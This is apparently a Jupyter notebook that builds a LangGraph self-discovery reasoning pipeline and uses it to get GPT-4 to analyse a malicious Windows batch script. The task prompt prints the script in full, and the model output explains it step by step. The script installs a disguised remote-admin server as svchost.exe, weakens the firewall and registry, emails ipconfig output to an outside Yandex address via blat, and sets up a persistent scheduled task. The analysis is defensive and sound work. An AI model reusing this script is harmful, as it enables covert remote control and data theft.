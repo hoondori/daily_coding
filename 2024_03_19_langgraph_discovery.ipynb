{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0066772-6095-46e1-aff2-1b7dd1a71312",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install langchain langchain_openai langchainhub langgraph"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "07f8da2a-eaab-40ed-90e2-fa22314095c6",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "os.environ[\"OPENAI_API_KEY\"] = \"sk-XXX\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "7c6fa99f-8e20-4105-b501-b652d702a528",
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain_openai import ChatOpenAI\n",
    "model = ChatOpenAI(temperature=0, model=\"gpt-4-turbo-preview\")\n",
    "from langchain import hub\n",
    "from langchain_core.prompts import PromptTemplate"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "53011461-fa8a-4376-a4aa-d505659a33e9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Select several reasoning modules that are crucial to utilize in order to solve the given task:\n",
      "\n",
      "All reasoning module descriptions:\n",
      "\u001b[33;1m\u001b[1;3m{reasoning_modules}\u001b[0m\n",
      "\n",
      "Task: \u001b[33;1m\u001b[1;3m{task_description}\u001b[0m\n",
      "\n",
      "Select several modules are crucial for solving the task above:\n",
      "\n"
     ]
    }
   ],
   "source": [
    "select_prompt = hub.pull(\"hwchase17/self-discovery-select\")\n",
    "select_prompt.pretty_print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "376d6a9e-58c3-4e81-9861-695f7a8215c2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Rephrase and specify each reasoning module so that it better helps solving the task:\n",
      "\n",
      "SELECTED module descriptions:\n",
      "\u001b[33;1m\u001b[1;3m{selected_modules}\u001b[0m\n",
      "\n",
      "Task: \u001b[33;1m\u001b[1;3m{task_description}\u001b[0m\n",
      "\n",
      "Adapt each reasoning module description to better solve the task:\n",
      "\n"
     ]
    }
   ],
   "source": [
    "adapt_prompt = hub.pull(\"hwchase17/self-discovery-adapt\")\n",
    "adapt_prompt.pretty_print()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "9f0d6474-5232-4e4b-8439-7387dc651290",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Operationalize the reasoning modules into a step-by-step reasoning plan in JSON format:\n",
      "\n",
      "Here's an example:\n",
      "\n",
      "Example task:\n",
      "\n",
      "If you follow these instructions, do you return to the starting point? Always face forward. Take 1 step backward. Take 9 steps left. Take 2 steps backward. Take 6 steps forward. Take 4 steps forward. Take 4 steps backward. Take 3 steps right.\n",
      "\n",
      "Example reasoning structure:\n",
      "\n",
      "{\n",
      "    \"Position after instruction 1\":\n",
      "    \"Position after instruction 2\":\n",
      "    \"Position after instruction n\":\n",
      "    \"Is final position the same as starting position\":\n",
      "}\n",
      "\n",
      "Adapted module description:\n",
      "\u001b[33;1m\u001b[1;3m{adapted_modules}\u001b[0m\n",
      "\n",
      "Task: \u001b[33;1m\u001b[1;3m{task_description}\u001b[0m\n",
      "\n",
      "Implement a reasoning structure for solvers to follow step-by-step and arrive at correct answer.\n",
      "\n",
      "Note: do NOT actually arrive at a conclusion in this pass. Your job is to generate a PLAN so that in the future you can fill it out and arrive at the correct conclusion for tasks like this\n"
     ]
    }
   ],
   "source": [
    "structured_prompt = hub.pull(\"hwchase17/self-discovery-structure\")\n",
    "structured_prompt.pretty_print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "cd7add2e-1211-4c61-bb50-02fb9dc6a542",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Follow the step-by-step reasoning plan in JSON to correctly solve the task. Fill in the values following the keys by reasoning specifically about the task given. Do not simply rephrase the keys.\n",
      "    \n",
      "Reasoning Structure:\n",
      "\u001b[33;1m\u001b[1;3m{reasoning_structure}\u001b[0m\n",
      "\n",
      "Task: \u001b[33;1m\u001b[1;3m{task_description}\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "reasoning_prompt = hub.pull(\"hwchase17/self-discovery-reasoning\")\n",
    "reasoning_prompt.pretty_print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "9db2e2a2-0f6a-4c6b-950b-17377f4e68c0",
   "metadata": {},
   "outputs": [],
   "source": [
    "from typing import TypedDict, Optional\n",
    "\n",
    "class SelfDiscoverState(TypedDict):\n",
    "    reasoning_modules: str\n",
    "    task_description: str\n",
    "    selected_modules: Optional[str]\n",
    "    adapted_modules: Optional[str]\n",
    "    reasoning_structure: Optional[str]\n",
    "    answer: Optional[str]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "6c1e0498-6ba3-41cf-a553-aa0e03212bf6",
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain.schema.output_parser import StrOutputParser\n",
    "\n",
    "def select(inputs):\n",
    "    select_chain = select_prompt | model | StrOutputParser()\n",
    "    return {\"selected_modules\": select_chain.invoke(inputs)}\n",
    "\n",
    "def adapt(inputs):\n",
    "    adapt_chain = adapt_prompt | model | StrOutputParser()\n",
    "    return {\"adapted_modules\": adapt_chain.invoke(inputs)}\n",
    "\n",
    "def structure(inputs):\n",
    "    structure_chain = structured_prompt | model | StrOutputParser()\n",
    "    return {\"reasoning_structure\": structure_chain.invoke(inputs)}\n",
    "\n",
    "def reason(inputs):\n",
    "    reasoning_chain = reasoning_prompt | model | StrOutputParser()\n",
    "    return {\"answer\": reasoning_chain.invoke(inputs)}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "8e7aff46-4e4e-488d-be6f-41122d37c2e3",
   "metadata": {},
   "outputs": [],
   "source": [
    "from langgraph.graph import StateGraph, END\n",
    "from typing import TypedDict, Optional\n",
    "\n",
    "graph = StateGraph(SelfDiscoverState)\n",
    "graph.add_node(\"select\", select)\n",
    "graph.add_node(\"adapt\", adapt)\n",
    "graph.add_node(\"structure\", structure)\n",
    "graph.add_node(\"reason\", reason)\n",
    "graph.add_edge(\"select\", \"adapt\")\n",
    "graph.add_edge(\"adapt\", \"structure\")\n",
    "graph.add_edge(\"structure\", \"reason\")\n",
    "graph.add_edge(\"reason\", END)\n",
    "graph.set_entry_point(\"select\")\n",
    "app = graph.compile()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "2a7a6afd-61b8-4e00-b3cc-237f95492311",
   "metadata": {},
   "outputs": [],
   "source": [
    "reasoning_modules = [\n",
    "    \"1. How could I devise an experiment to help solve that problem?\",\n",
    "    \"2. Make a list of ideas for solving this problem, and apply them one by one to the problem to see if any progress can be made.\",\n",
    "    # \"3. How could I measure progress on this problem?\",\n",
    "    \"4. How can I simplify the problem so that it is easier to solve?\",\n",
    "    \"5. What are the key assumptions underlying this problem?\",\n",
    "    \"6. What are the potential risks and drawbacks of each solution?\",\n",
    "    \"7. What are the alternative perspectives or viewpoints on this problem?\",\n",
    "    \"8. What are the long-term implications of this problem and its solutions?\",\n",
    "    \"9. How can I break down this problem into smaller, more manageable parts?\",\n",
    "    \"10. Critical Thinking: This style involves analyzing the problem from different perspectives, questioning assumptions, and evaluating the evidence or information available. It focuses on logical reasoning, evidence-based decision-making, and identifying potential biases or flaws in thinking.\",\n",
    "    \"11. Try creative thinking, generate innovative and out-of-the-box ideas to solve the problem. Explore unconventional solutions, thinking beyond traditional boundaries, and encouraging imagination and originality.\",\n",
    "    # \"12. Seek input and collaboration from others to solve the problem. Emphasize teamwork, open communication, and leveraging the diverse perspectives and expertise of a group to come up with effective solutions.\",\n",
    "    \"13. Use systems thinking: Consider the problem as part of a larger system and understanding the interconnectedness of various elements. Focuses on identifying the underlying causes, feedback loops, and interdependencies that influence the problem, and developing holistic solutions that address the system as a whole.\",\n",
    "    \"14. Use Risk Analysis: Evaluate potential risks, uncertainties, and tradeoffs associated with different solutions or approaches to a problem. Emphasize assessing the potential consequences and likelihood of success or failure, and making informed decisions based on a balanced analysis of risks and benefits.\",\n",
    "    # \"15. Use Reflective Thinking: Step back from the problem, take the time for introspection and self-reflection. Examine personal biases, assumptions, and mental models that may influence problem-solving, and being open to learning from past experiences to improve future approaches.\",\n",
    "    \"16. What is the core issue or problem that needs to be addressed?\",\n",
    "    \"17. What are the underlying causes or factors contributing to the problem?\",\n",
    "    \"18. Are there any potential solutions or strategies that have been tried before? If yes, what were the outcomes and lessons learned?\",\n",
    "    \"19. What are the potential obstacles or challenges that might arise in solving this problem?\",\n",
    "    \"20. Are there any relevant data or information that can provide insights into the problem? If yes, what data sources are available, and how can they be analyzed?\",\n",
    "    \"21. Are there any stakeholders or individuals who are directly affected by the problem? What are their perspectives and needs?\",\n",
    "    \"22. What resources (financial, human, technological, etc.) are needed to tackle the problem effectively?\",\n",
    "    \"23. How can progress or success in solving the problem be measured or evaluated?\",\n",
    "    \"24. What indicators or metrics can be used?\",\n",
    "    \"25. Is the problem a technical or practical one that requires a specific expertise or skill set? Or is it more of a conceptual or theoretical problem?\",\n",
    "    \"26. Does the problem involve a physical constraint, such as limited resources, infrastructure, or space?\",\n",
    "    \"27. Is the problem related to human behavior, such as a social, cultural, or psychological issue?\",\n",
    "    \"28. Does the problem involve decision-making or planning, where choices need to be made under uncertainty or with competing objectives?\",\n",
    "    \"29. Is the problem an analytical one that requires data analysis, modeling, or optimization techniques?\",\n",
    "    \"30. Is the problem a design challenge that requires creative solutions and innovation?\",\n",
    "    \"31. Does the problem require addressing systemic or structural issues rather than just individual instances?\",\n",
    "    \"32. Is the problem time-sensitive or urgent, requiring immediate attention and action?\",\n",
    "    \"33. What kinds of solution typically are produced for this kind of problem specification?\",\n",
    "    \"34. Given the problem specification and the current best solution, have a guess about other possible solutions.\"\n",
    "    \"35. Let’s imagine the current best solution is totally wrong, what other ways are there to think about the problem specification?\"\n",
    "    \"36. What is the best way to modify this current best solution, given what you know about these kinds of problem specification?\"\n",
    "    \"37. Ignoring the current best solution, create an entirely new solution to the problem.\"\n",
    "    # \"38. Let’s think step by step.\"\n",
    "    \"39. Let’s make a step by step plan and implement it with good notation and explanation.\",\n",
    "]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "6eaf4103-018a-478e-ba80-3be6cc6935aa",
   "metadata": {},
   "outputs": [],
   "source": [
    "reasoning_modules_str = \"\\n\".join(reasoning_modules)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "18ddbc65-ad61-4eac-8930-3da21ed0121c",
   "metadata": {},
   "source": [
    "# 악성 코드 설명에 적용 "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a14c0c3-ba3f-4b10-82f1-c65741bdf73f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "\n",
    "print (json.dumps(yasin, indent=2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "c77a05d4-32d0-479e-bc67-9df063d9697b",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "task_example = \"\"\"\n",
    "As a professional security analyst, \n",
    "You will provide step-by-step analysis of the malicious batch script that user provided and explain its malicious intent. \n",
    "By breaking down the code snippet and providing partial segments for each specific analysis, \n",
    "You'll uncover the potential harm it can cause.\n",
    "\n",
    "This is body of malicious batch script:\n",
    "<code>\n",
    "b'\\r\\n\\r\\ncmdow @ /HID\\r\\n\\r\\n\\r\\ncopy /y \"blat.exe\" \"%SYSTEMROOT%/system32/blat.exe\"\\r\\ncopy /y \"blat.lib\" \"%SYSTEMROOT%/system32/blat.lib\"\\r\\ncopy /y \"blat.dll\" \"%SYSTEMROOT%/system32/blat.dll\\r\\ncopy /y \"svchost.exe\" \"%SYSTEMROOT%/svchost.exe\" \\r\\ncopy /y \"raddrv.dll\" \"%SYSTEMROOT%/raddrv.dll\"\\r\\ncopy /y \"admdll.dll\" \"%SYSTEMROOT%/admdll.dll\"\\r\\n\\r\\nnetsh firewall add allowedprogram \"%Windir%\\svchost.exe\" \"Remote Administrator Server\" ENABLE\\r\\n\\r\\nREG ADD HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters /v DisableTrayIcon /t REG_BINARY /d 00000001 /f\\r\\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\r_server /v DisplayName /t REG_SZ /d \"Service Host Controller\" /f\\r\\n\\r\\n\"%SYSTEMROOT%/svchost.exe\" /install /silence\\r\\n\"%SYSTEMROOT%/svchost.exe\" /start\\r\\n\\r\\n%SYSTEMROOT%/system32/blat.exe -install -server smtp.yandex.ru -port 587 -f railpunk@yandex.ru -u Railpunk -pw 462855\\r\\n\\r\\nipconfig /all > %systemroot%/system32/ip.txt\\r\\n\\r\\nblat.exe %systemroot%/system32/ip.txt -to ypyachka-jkjkj@yandex.ru. \\r\\n\\r\\nschtasks /create /tn \"security\" /sc minute /mo 15 /ru \"NT AUTHORITY\\SYSTEM\" /tr %SYSTEMROOT%/system32\\ip.bat\\r\\n\\r\\n\\r\\ndel cmdow.exe\\r\\ndel blat.exe\\r\\ndel blat.lib\\r\\ndel blat.dll\\r\\ndel raddrv.dll\\r\\ndel admdll.dll\\r\\ndel svchost.exe\\r\\ndel install.bat'\n",
    "</code>\n",
    "\n",
    "explain harmful intent of malicious batch script\n",
    "\"\"\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e5847826-2ea6-49ef-84d7-11e65ad9a536",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "results = []\n",
    "for s in app.stream(\n",
    "    {\"task_description\": task_example, \"reasoning_modules\": reasoning_modules_str}\n",
    "):\n",
    "    import json\n",
    "    results.append(s)\n",
    "    #print(json.dumps(s, indent=2, default=str))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "7e312d9c-ef68-49e1-8395-4eab97e94d6a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "To effectively analyze and explain the harmful intent of the provided malicious batch script, several reasoning modules are crucial. These modules will help break down the script, understand its components, and assess its potential impact. The selected modules are:\n",
       "\n",
       "1. **Critical Thinking (10)**: This module is essential for analyzing the script from different perspectives, questioning the intentions behind each command, and evaluating the potential harm each segment could cause. It involves logical reasoning and evidence-based decision-making.\n",
       "\n",
       "2. **Systems Thinking (13)**: Understanding how this script interacts with the larger system (in this case, a computer's operating system and network) is crucial. This module helps in identifying the underlying causes and interdependencies between the script's actions and the system's vulnerabilities it exploits.\n",
       "\n",
       "3. **Risk Analysis (14)**: Evaluating the potential risks and consequences associated with the script's actions is vital. This includes assessing the likelihood of success for each malicious action and the potential damage or security breach it could cause.\n",
       "\n",
       "4. **Breaking Down the Problem (9)**: The script should be broken down into smaller, more manageable parts for specific analysis. This involves dissecting each command and understanding its function and potential impact individually.\n",
       "\n",
       "5. **Identifying Core Issues (16)**: Identifying the core malicious intents and actions within the script that need to be addressed. This includes recognizing actions such as copying malicious files, modifying system settings, and executing unauthorized commands.\n",
       "\n",
       "6. **Understanding Technical Details (25)**: Given that the task involves analyzing a batch script, a technical understanding of batch scripting, system commands, and their implications is necessary. This includes knowledge of system directories, executable files, and network commands.\n",
       "\n",
       "7. **Analyzing Potential Obstacles (19)**: Considering potential obstacles in analyzing the script, such as obfuscated code or commands that may not have immediate apparent effects.\n",
       "\n",
       "8. **Data Analysis (29)**: Analyzing the data flow within the script, such as the creation of files, gathering of system information, and the unauthorized sending of this information to external parties.\n",
       "\n",
       "9. **Step-by-Step Plan (39)**: Creating a step-by-step plan to analyze each segment of the script, explaining its function, and uncovering its malicious intent. This involves methodically going through the script, providing analysis for each command, and summarizing the potential harm.\n",
       "\n",
       "By utilizing these reasoning modules, a comprehensive analysis of the malicious batch script can be conducted, revealing its harmful intent and potential impact on systems it targets."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# SELECT\n",
    "from IPython.display import display, Markdown, Latex\n",
    "display(Markdown(results[0]['select']['selected_modules']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "4c079b2d-d28d-4792-bbc6-ff99cf9c5561",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "To effectively dissect and elucidate the malevolent objectives of the provided malicious batch script, it is imperative to employ a suite of refined reasoning modules. These modules are tailored to meticulously analyze the script's components, comprehend its mechanics, and gauge its potential ramifications. The refined modules for this task are as follows:\n",
       "\n",
       "1. **Enhanced Critical Analysis (10)**: This module is pivotal for a deep dive into the script's architecture, scrutinizing the purpose behind each command, and gauging the potential threats each segment may unleash. It leverages logical scrutiny and evidence-backed conclusions to dissect the script's intent.\n",
       "\n",
       "2. **Advanced Systems Interaction Understanding (13)**: This module is key to comprehending how the script manipulates and interacts with broader system components, such as the operating system and network infrastructure. It aids in pinpointing the script's exploitation of system vulnerabilities through a thorough examination of cause-and-effect relationships and system interdependencies.\n",
       "\n",
       "3. **Comprehensive Risk Evaluation (14)**: This module is essential for a detailed assessment of the risks and repercussions emanating from the script's execution. It involves a thorough analysis of the probability of each malicious action's success and the extent of damage or security compromise it could instigate.\n",
       "\n",
       "4. **Segmented Problem Decomposition (9)**: This module advocates for breaking down the script into smaller, more digestible segments for targeted analysis. It entails a command-by-command dissection to understand each command's functionality and its potential threat landscape individually.\n",
       "\n",
       "5. **Malicious Intent Identification (16)**: This module focuses on pinpointing the script's primary malevolent objectives and actions that warrant immediate attention. It involves recognizing actions such as unauthorized file duplication, system configuration alterations, and execution of unsanctioned commands.\n",
       "\n",
       "6. **Technical Detail Mastery (25)**: Given the task's nature, a profound technical grasp of batch scripting, system command functionalities, and their implications is indispensable. This encompasses an understanding of system directories, executable files, and network-related commands.\n",
       "\n",
       "7. **Obstacle Analysis (19)**: This module considers potential hurdles in the script analysis, including code obfuscation or commands with delayed or hidden effects, facilitating a more thorough examination.\n",
       "\n",
       "8. **Data Flow Examination (29)**: This module involves a meticulous analysis of the script's data manipulation processes, such as file creation, system information harvesting, and unauthorized data transmission to external entities.\n",
       "\n",
       "9. **Structured Analytical Methodology (39)**: This module outlines a systematic approach to dissect each script segment, elucidate its functionality, and unveil its malevolent purposes. It involves a stepwise traversal of the script, offering detailed command analysis and summarizing the potential threats posed.\n",
       "\n",
       "By leveraging these refined reasoning modules, a comprehensive and detailed analysis of the malicious batch script can be achieved, uncovering its detrimental intentions and the potential hazards it poses to targeted systems."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# IMPLEMENT\n",
    "from IPython.display import display, Markdown, Latex\n",
    "display(Markdown(results[1]['adapt']['adapted_modules']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "d80720df-eea4-486d-800a-ed0ab7a867be",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "```json\n",
       "{\n",
       "  \"Analysis Plan\": [\n",
       "    {\n",
       "      \"Step\": 1,\n",
       "      \"Module\": \"Enhanced Critical Analysis\",\n",
       "      \"Action\": \"Identify and list all commands in the script.\",\n",
       "      \"Purpose\": \"To understand the structure and components of the script.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 2,\n",
       "      \"Module\": \"Segmented Problem Decomposition\",\n",
       "      \"Action\": \"Break down the script into segments based on functionality.\",\n",
       "      \"Purpose\": \"To simplify the analysis by focusing on smaller parts.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 3,\n",
       "      \"Module\": \"Technical Detail Mastery\",\n",
       "      \"Action\": \"Research each command's functionality and potential uses.\",\n",
       "      \"Purpose\": \"To gain a deep understanding of what each script segment does.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 4,\n",
       "      \"Module\": \"Advanced Systems Interaction Understanding\",\n",
       "      \"Action\": \"Analyze how the script interacts with system components.\",\n",
       "      \"Purpose\": \"To identify how the script exploits system vulnerabilities.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 5,\n",
       "      \"Module\": \"Malicious Intent Identification\",\n",
       "      \"Action\": \"Identify actions within the script that have malicious intent.\",\n",
       "      \"Purpose\": \"To pinpoint the primary malevolent objectives of the script.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 6,\n",
       "      \"Module\": \"Comprehensive Risk Evaluation\",\n",
       "      \"Action\": \"Assess the risks associated with each identified malicious action.\",\n",
       "      \"Purpose\": \"To evaluate the potential damage or security compromise.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 7,\n",
       "      \"Module\": \"Obstacle Analysis\",\n",
       "      \"Action\": \"Identify potential hurdles in analyzing the script.\",\n",
       "      \"Purpose\": \"To anticipate and address challenges such as code obfuscation.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 8,\n",
       "      \"Module\": \"Data Flow Examination\",\n",
       "      \"Action\": \"Analyze the script's data manipulation processes.\",\n",
       "      \"Purpose\": \"To understand unauthorized data transmission or file manipulation.\"\n",
       "    },\n",
       "    {\n",
       "      \"Step\": 9,\n",
       "      \"Module\": \"Structured Analytical Methodology\",\n",
       "      \"Action\": \"Summarize the findings from each step and conclude the analysis.\",\n",
       "      \"Purpose\": \"To compile a comprehensive report on the script's harmful intent.\"\n",
       "    }\n",
       "  ]\n",
       "}\n",
       "```"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# IMPLEMENT\n",
    "from IPython.display import display, Markdown, Latex\n",
    "display(Markdown(results[2]['structure']['reasoning_structure']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "527b70a0-cac2-4982-afb9-90c7e38402e9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "Based on the provided malicious batch script, let's follow the reasoning structure to analyze its components and uncover its harmful intent.\n",
       "\n",
       "### Step 1: Identify and list all commands in the script.\n",
       "\n",
       "- `cmdow @ /HID`\n",
       "- `copy /y`\n",
       "- `netsh firewall add allowedprogram`\n",
       "- `REG ADD`\n",
       "- `\"%SYSTEMROOT%/svchost.exe\" /install /silence`\n",
       "- `\"%SYSTEMROOT%/svchost.exe\" /start`\n",
       "- `%SYSTEMROOT%/system32/blat.exe -install`\n",
       "- `ipconfig /all > %systemroot%/system32/ip.txt`\n",
       "- `blat.exe %systemroot%/system32/ip.txt -to`\n",
       "- `schtasks /create`\n",
       "- `del`\n",
       "\n",
       "### Step 2: Break down the script into segments based on functionality.\n",
       "\n",
       "1. **Hiding the Command Window**: `cmdow @ /HID`\n",
       "2. **Copying Files**: Multiple `copy /y` commands to copy executables and libraries to system directories.\n",
       "3. **Firewall Configuration**: `netsh firewall add allowedprogram`\n",
       "4. **Registry Modifications**: Multiple `REG ADD` commands to modify system settings.\n",
       "5. **Executing Malicious Software**: Commands to install and start a malicious `svchost.exe`.\n",
       "6. **Email Configuration and Data Exfiltration**: Using `blat.exe` for email setup and sending system information.\n",
       "7. **Scheduling Tasks**: `schtasks /create` to persistently execute tasks.\n",
       "8. **Cleanup**: Multiple `del` commands to remove traces of the tools used.\n",
       "\n",
       "### Step 3: Research each command's functionality and potential uses.\n",
       "\n",
       "- `cmdow @ /HID`: Hides the command window to avoid detection.\n",
       "- `copy /y`: Copies files, potentially malicious, to system directories to maintain persistence.\n",
       "- `netsh firewall add allowedprogram`: Modifies the firewall to allow the malicious `svchost.exe` through.\n",
       "- `REG ADD`: Modifies registry settings to disable security notifications and change service display names to hide malicious activities.\n",
       "- `\"%SYSTEMROOT%/svchost.exe\"`: Executes a malicious copy of `svchost.exe`, masquerading as a legitimate system process.\n",
       "- `blat.exe`: Command-line email tool used here to send system information to an attacker.\n",
       "- `ipconfig /all > %systemroot%/system32/ip.txt`: Dumps system IP configuration for exfiltration.\n",
       "- `schtasks /create`: Creates scheduled tasks for repeated execution of malicious activities.\n",
       "- `del`: Deletes files to cover tracks.\n",
       "\n",
       "### Step 4: Analyze how the script interacts with system components.\n",
       "\n",
       "The script interacts with system components by:\n",
       "- Hiding its execution window to avoid user detection.\n",
       "- Copying malicious files into system directories to ensure they're executed from trusted locations.\n",
       "- Modifying firewall and registry settings to bypass security measures and hide its presence.\n",
       "- Executing a malicious version of `svchost.exe` to perform unauthorized activities under the guise of a legitimate process.\n",
       "- Using scheduled tasks for persistence, ensuring the malicious activities continue even after reboot.\n",
       "\n",
       "### Step 5: Identify actions within the script that have malicious intent.\n",
       "\n",
       "- Hiding the command window.\n",
       "- Copying and executing malicious files.\n",
       "- Modifying firewall and registry settings to weaken security.\n",
       "- Exfiltrating system information via email.\n",
       "- Creating persistent scheduled tasks for ongoing exploitation.\n",
       "\n",
       "### Step 6: Assess the risks associated with each identified malicious action.\n",
       "\n",
       "- **Hiding Execution**: Avoids detection, allowing the script to operate unnoticed.\n",
       "- **Copying and Executing Malicious Files**: Can lead to unauthorized control, data theft, or further malware infection.\n",
       "- **Modifying Security Settings**: Weakens the system's defenses, making it more vulnerable to attacks.\n",
       "- **Data Exfiltration**: Compromises privacy and could lead to targeted phishing or further attacks.\n",
       "- **Persistent Tasks**: Ensures the malware remains active, causing continuous harm.\n",
       "\n",
       "### Step 7: Identify potential hurdles in analyzing the script.\n",
       "\n",
       "- Code obfuscation techniques like renaming malicious files to mimic legitimate ones.\n",
       "- The use of legitimate tools (e.g., `blat.exe`) for malicious purposes, complicating intent assessment.\n",
       "- The script's ability to delete itself and other tools used, erasing evidence of its presence.\n",
       "\n",
       "### Step 8: Analyze the script's data manipulation processes.\n",
       "\n",
       "- Collects system IP configuration data.\n",
       "- Configures an email client for unauthorized use.\n",
       "- Sends collected data to an attacker's email, leading to unauthorized data access.\n",
       "\n",
       "### Step 9: Summarize the findings from each step and conclude the analysis.\n",
       "\n",
       "The malicious batch script is designed to operate stealthily by hiding its window, copying malicious files into system directories, and modifying system settings to avoid detection and weaken security. It installs a malicious version of `svchost.exe` to perform unauthorized activities and uses `blat.exe` to exfiltrate system information to an attacker. The script sets up persistent tasks for ongoing exploitation and attempts to cover its tracks by deleting the tools used. The primary harmful intents are unauthorized system control, data theft, and ensuring persistence to facilitate continuous exploitation."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# APPLY ONTO SPECIFIC TASK INSTANCE\n",
    "from IPython.display import display, Markdown, Latex\n",
    "display(Markdown(results[3]['reason']['answer']))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "langgraph",
   "language": "python",
   "name": "langgraph"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
